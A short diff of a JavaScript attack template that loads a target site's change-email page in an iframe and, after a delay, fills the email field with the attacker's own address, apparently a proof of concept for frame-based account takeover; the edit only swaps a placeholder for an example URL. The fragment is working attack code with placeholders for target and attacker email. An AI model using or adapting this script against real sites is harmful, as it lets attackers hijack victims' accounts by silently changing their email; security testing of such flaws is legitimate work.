@@ -13,7 +13,7 @@ document.addEventListener("DOMContentLoaded", function() {
 
 function buildFrame() {
     let frame=document.createElement("iframe")
-    frame.src="<TARGET-URL>/change-email"
+    frame.src="<TARGET-URL (eg https://joemardell.com/change-email)>"
     document.body.append(frame)
     setTimeout(function(){
         frame.contentDocument.getElementById("EmailAddress").value="<YOUR-EMAIL>"
